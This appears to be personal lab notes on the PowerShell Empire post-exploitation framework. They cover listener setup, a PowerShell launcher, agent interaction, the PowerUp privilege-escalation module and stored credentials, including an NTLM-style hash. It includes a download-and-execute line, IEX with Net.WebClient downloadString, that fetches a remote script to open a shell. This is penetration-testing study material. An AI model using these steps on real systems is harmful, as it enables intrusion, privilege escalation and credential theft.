# Powershell Empire

Started using this today, it's really cool. Takes a lot of the work out of finding scripts to run.

Firing it up:

```bash
/data/reset.sh
```

Run it with that to reset the database, otherwise it  seems to fail to start, not always though so if you just need to start  it (and it doesn't crash) then do:

```bash
./empire
```

Setup a Listener

```bash
listeners
```

Once you're inside that menu do:

```bash
uselistener <tab-completion-works-here>
```

View options with:

```bash
info
```

Then use set to configure the connection for your IP/Port:

```bash
set Host 10.10.14.3:443
set Port 443
```

For the shell to come back the ports need to match (or so it appears)

To start the listener:

```bash
execute
```

Then run:

```bash
launcher powershell
```

This will fire back the other half of the shell, which you can execute with IEX(New-Object Net.WebClient)downloadString('http://yoursever/yourfile.ps1')

Interacting with Agents
Head back to the main menu using back
Now type agents to see a list of active agents.
Get the name of the agent you wish to interact with, and type:

```bash
interact <agent-name>
(Empire) > interact ASWX9H8G
(Empire: ASWX9H8G) >
```

Now you can type:

```bash
searchmodule <modulename (not case sensitive)
```

Using Modules
Once you've found the module you're looking for run:

```bash
usemodule <module-name>
```

Then type info and hit enter to see the options:

```bash
(Empire: ASWX9H8G) > usemodule privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > info

              Name: Invoke-AllChecks
            Module: powershell/privesc/powerup/allchecks
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Runs all current checks for Windows privesc vectors.

Comments:
  https://github.com/PowerShellEmpire/PowerTools/tree/master/P
  owerUp

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        ASWX9H8G                  Agent to run module on.

```
  
In this case we can just type execute and then hit enter

```bash
(Empire: powershell/privesc/powerup/allchecks) > execute
[*] Tasked ASWX9H8G to run TASK_CMD_JOB
[*] Agent ASWX9H8G tasked with task ID 4
[*] Tasked agent ASWX9H8G to run module powershell/privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > [*] Agent ASWX9H8G returned results.
Job started: F9E4KY
[*] Valid results returned by 10.10.10.81
Wait a few seconds. And that should output what it managed to find. 
```

## Credentials

creds add domain username password

Use creds to see all stored credentials.

For some modules you can then just use set CredID `<ID number>` and not have to type in the username and password.

Getting Trolled By CredTypes
If you see:

[!] A CredID with a plaintext password must be used!

Then check creds.

If the password is the wrong type, readd it with the following:

creds add DESKTOP-7I3S68E Administrator 3130438f31186fbaf962f407711faddb something plaintext

Then just use the new ID and you gucci
